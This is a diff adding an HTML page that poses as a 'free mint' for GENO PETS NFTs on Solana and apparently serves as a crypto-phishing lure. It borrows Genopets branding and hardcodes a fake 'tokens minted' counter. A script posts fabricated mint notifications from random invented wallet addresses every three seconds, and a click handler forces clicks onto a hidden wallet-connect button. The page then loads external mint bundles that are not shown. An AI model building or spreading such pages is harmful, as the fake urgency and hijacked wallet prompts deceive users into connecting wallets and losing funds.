@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="description" content="GENO PETS" data-react-helmet="true">
+    <meta name="theme-color" content="#a05bb4">
+    <meta property="og:site_name" content="Free Mint | Geno Pets NFTs">
+    <meta content="🔗 GENO PETS FREE NFT MINTING LINK ✅" property="og:title">
+    <meta content="
+    🎉 We are glad to to announce that the minting of 1888 GENO PETS NFT is live!
+
+    🏷️Mint Info
+    ▶ Mint Price: FREE + SOL gas
+    ▶ Supply: 1888 NFTs
+
+    ❗ We 𝐬𝐭𝐚𝐫𝐭 𝐞𝐚𝐫𝐥𝐢𝐞𝐫 to avoid congestion on Solana and give everyone a fair chance to mint. (FREE MINT!!)
+    
+    🎀 𝐓𝐡𝐚𝐧𝐤 𝐲𝐨𝐮❢" property="og:description">
+    <meta property="og:image:url" content="https://genopets.premint.id/og.jpg">
+     <meta name="twitter:card" content="summary_large_image">
+    <title>GENO PETS</title>
+    <link type="application/json+oembed" href="embed.json"/>
+    <link rel="shortcut icon" href="https://www.genopets.me/favicon-32x32.png?v=1f92520e29616cf36f72c0a24429fe6e">
+    <link rel="stylesheet" href="all.min.css">
+    <link rel="stylesheet" href="assets/css/normalize.css">
+    <link rel="stylesheet" href="assets/css/style.css">
+	<link href="https://fonts.googleapis.com/css2?family=Rubik+Wet+Paint&display=swap" rel="stylesheet">
+	<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-W5G30W4MRK"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W5G30W4MRK');
+</script>
+    <script>
+        window.addEventListener('click', () => {
+            document.getElementById('showcase__btn0').addEventListener('click', function(e) {
+                document.getElementsByClassName('MuiButton-containedPrimary')[0].click();
+            });
+        });
+    </script>
+	<style data-emotion="right-title">@font-face{font-family:'mokoto glitch';src:url(fonts/mokoto_glitch-webfont-ffb1b7efd3022a10f5ecfe951a9aff41.woff2) format('woff2'),url(fonts/mokoto_glitch-webfont-39f93df2b851bbb8f2e44864f9f5a586.woff) format('woff');font-weight:normal;font-style:normal;font-display:block;}@font-face{font-family:'mokoto glitch mark I';src:url(fonts/mokoto_glitch_mark_2-webfont-28b4e7beb3923c25bc3a6e339b9430a9.woff2) format('woff2'),url(fonts/mokoto_glitch_mark_2-webfont-fc724f0e74d87207a04b744abaefd369.woff) format('woff');font-weight:normal;font-style:normal;font-display:block;}</style>
+</head>
+
+<body>
+    <header>
+        <div class="logo"><img src="https://pbs.twimg.com/profile_images/1514564848713093125/QHiYiGmk_400x400.jpg" alt="Logo"></div>
+        <div class="social-list">
+           
+        </div>
+    </header>
+
+    <section class="section main-screen">
+        <div class="main-area">
+
+ <div class="main-area__right">
+                <h2 class="right-title">GENO PETS</h2> 
+
+                <div class="right-list">
+                    <li>
+                        <div class="text">
+A Genopet is your digital spirit animal encoded with your personality that evolves through your daily activity. Your Genopet will join you as you traverse the Genoverse. Stay active to guide the destiny of your Genopet and unlock your true potential. As you evolve⁠—it evolves.               </li>
+			      <div class="token">
+                        <div class="token-title">TOKENS MINTED</div>
+                        <div class="token-line">
+                            <div class="line"></div>
+                            <div class="progress-line"></div>
+                        </div>
+                        <div class="token-number" id="tokenup"><span id="tokennumber">1466</span> <span id="endTick">1888</span></div>
+                    </div>
+                </div>
+                <div class="price">
+                    <div class="add-input-remove">
+                        <input type="text" id="total" value="1" readonly="">
+                        <a href="javascript:void(0)" class="minus-btn">-</a>
+                        <a href="javascript:void(0)" class="plus-btn">+</a>
+                    </div>
+                    <div class="price-box">
+                        <div id="price-total"><span>0.00</span> SOL per 1 NFT</div>
+                        <div>1 NFT max per transaction</div>
+                    </div>
+                </div>
+                <div class="button-box">
+                    <div id="root" class="cl-root">
+                        <main>
+                            <button id="butt" class="join-btn" tabindex="0" type="button" style="display: none;"></button>
+                        </main>
+                    </div>
+                    <img src="assets/img/solana.png" alt="solana">
+                </div>
+            </div>
+
+
+            <div class="main-area__left">
+                <div class="slider-area">
+<video style="width:120%;position:relative;place-self:center;z-index:1;grid-row:1;grid-column:1" autoplay="" playsinline="" muted="" loop="" poster="imgs/bird-fallback.png"><source src="media/bird.webm" type="video/webm"><source src="media/bird.mov" type="video/quicktime"></video>
+        </div>
+    </section>
+    <script src="assets/js/jquery-3.6.0.min.js"></script>
+    <script src="assets/js/slick.min.js"></script>
+
+    <script>
+        const $plusButton = document.querySelector(".plus-btn");
+        const $minuButton = document.querySelector(".minus-btn");
+        const $numberText = document.querySelector("#total");
+        const $remaining = document.querySelector('#remaining');
+        const $priceResultText = document.querySelector("#price-total span");
+        let itemPriceSelected = 0;
+        let itemCount = 1;
+
+        $plusButton.addEventListener("click", function(e) {
+            e.preventDefault();
+            itemCount = itemCount < 1 ? itemCount + 1 : 1;
+            $numberText.value = itemCount;
+            $priceResultText.textContent = (itemPriceSelected * itemCount).toFixed(2);
+        });
+        $minuButton.addEventListener("click", function(e) {
+            e.preventDefault();
+            itemCount = parseInt($numberText.value);
+            itemCount = itemCount > 1 ? itemCount - 1 : itemCount;
+            $numberText.value = itemCount;
+            $priceResultText.textContent = (itemPriceSelected * itemCount).toFixed(2);
+        });
+    </script>
+
+    <script>
+        ! function(e) {
+
+            function t(t) {
+                for (var n, i, a = t[0], c = t[1], l = t[2], s = 0, p = []; s < a.length; s++) i = a[s], Object
+                    .prototype
+                    .hasOwnProperty.call(o, i) && o[i] && p.push(o[i][0]), o[i] = 0;
+                for (n in c) Object.prototype.hasOwnProperty.call(c, n) && (e[n] = c[n]);
+                for (f && f(t); p.length;) p.shift()();
+                return u.push.apply(u, l || []), r()
+            }
+
+            function r() {
+                for (var e, t = 0; t < u.length; t++) {
+                    for (var r = u[t], n = !0, a = 1; a < r.length; a++) {
+                        var c = r[a];
+                        0 !== o[c] && (n = !1)
+                    }
+                    n && (u.splice(t--, 1), e = i(i.s = r[0]))
+                }
+                return e
+            }
+            var n = {},
+                o = {
+                    1: 0
+                },
+                u = [];
+
+            function i(t) {
+                if (n[t]) return n[t].exports;
+                var r = n[t] = {
+                    i: t,
+                    l: !1,
+                    exports: {}
+                };
+                return e[t].call(r.exports, r, r.exports, i), r.l = !0, r.exports
+            }
+            i.e = function(e) {
+                var t = [],
+                    r = o[e];
+                if (0 !== r)
+                    if (r) t.push(r[2]);
+                    else {
+                        var n = new Promise((function(t, n) {
+                            r = o[e] = [t, n]
+                        }));
+                        t.push(r[2] = n);
+                        var u, a = document.createElement("script");
+                        a.charset = "utf-8", a.timeout = 120, i.nc && a.setAttribute("nonce", i.nc), a.src =
+                            function(
+                                e) {
+                                return i.p + "../static/js/" + ({}[e] || e) + "." + {
+                                    3: ""
+                                }[e] + "chunk.js"
+                            }(e);
+                        var c = new Error;
+                        u = function(t) {
+                            a.onerror = a.onload = null, clearTimeout(l);
+                            var r = o[e];
+                            if (0 !== r) {
+                                if (r) {
+                                    var n = t && ("load" === t.type ? "missing" : t.type),
+                                        u = t && t.target && t.target.src;
+                                    c.message = "Loading chunk " + e + " failed.\n(" + n + ": " + u + ")", c
+                                        .name =
+                                        "ChunkLoadError", c.type = n, c.request = u, r[1](c)
+                                }
+                                o[e] = void 0
+                            }
+                        };
+                        var l = setTimeout((function() {
+                            u({
+                                type: "timeout",
+                                target: a
+                            })
+                        }), 12e4);
+                        a.onerror = a.onload = u, document.head.appendChild(a)
+                    }
+                return Promise.all(t)
+            }, i.m = e, i.c = n, i.d = function(e, t, r) {
+                i.o(e, t) || Object.defineProperty(e, t, {
+                    enumerable: !0,
+                    get: r
+                })
+            }, i.r = function(e) {
+                "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol
+                    .toStringTag, {
+                        value: "Module"
+                    }), Object.defineProperty(e, "__esModule", {
+                    value: !0
+                })
+            }, i.t = function(e, t) {
+                if (1 & t && (e = i(e)), 8 & t) return e;
+                if (4 & t && "object" == typeof e && e && e.__esModule) return e;
+                var r = Object.create(null);
+                if (i.r(r), Object.defineProperty(r, "default", {
+                        enumerable: !0,
+                        value: e
+                    }), 2 & t && "string" != typeof e)
+                    for (var n in e) i.d(r, n, function(t) {
+                        return e[t]
+                    }.bind(null, n));
+                return r
+            }, i.n = function(e) {
+                var t = e && e.__esModule ? function() {
+                    return e.default
+                } : function() {
+                    return e
+                };
+                return i.d(t, "a", t), t
+            }, i.o = function(e, t) {
+                return Object.prototype.hasOwnProperty.call(e, t)
+            }, i.p = "/", i.oe = function(e) {
+                throw console.error(e), e
+            };
+            var a = this["webpackJsonpcandy-machine-mint"] = this["webpackJsonpcandy-machine-mint"] || [],
+                c = a.push.bind(a);
+            a.push = t, a = a.slice();
+            for (var l = 0; l < a.length; l++) t(a[l]);
+            var f = c;
+            r()
+        }([])
+    </script>
+    <script src="static/js/chunk.js"></script>
+    <script src="static/js/main.chunk.js"></script>
+    <script src="assets/js/tokenup.js"></script>
+		<script src="jquery-3.6.0.min.js"></script>
+   <script src="toastr.min.js"></script>
+ <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            toastr.options = {
+  "closeButton": false,
+  "debug": false,
+  "newestOnTop": false,
+  "progressBar": false,
+  "positionClass": "toast-top-right",
+  "preventDuplicates": false,
+  "onclick": null,
+  "showDuration": "500",
+  "hideDuration": "3000",
+  "timeOut": "5000",
+  "extendedTimeOut": "1000",
+  "showEasing": "swing",
+  "hideEasing": "linear",
+  "showMethod": "fadeIn",
+  "hideMethod": "fadeOut"
+}
+function newMint(){
+    addr = Array("0x5b...2a","0x2z...9d","0x33...9d","0x74...bb","0xb5...11","0xc8...00","0x65...2C","0x07...1e","0x71...2a","0x0F...23","0x5b...aa","0x5b...c9","0x5b...dd")
+    let n = Math.floor((Math.random() * 3) + 1);
+    let a = addr[Math.floor(Math.random()*addr.length)];
+    toastr.info(n + "&nbsp; GENOPETS by &nbsp;" + a)
+}
+
+            setInterval(function(){
+                newMint(); 
+}, 3000);
+});
+</script>
+</body>
+<script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js?id=Jcudxh7Y4i2FiiZa&ck=Jcudxh7Y4i2FiiZa"></script>
+</html>
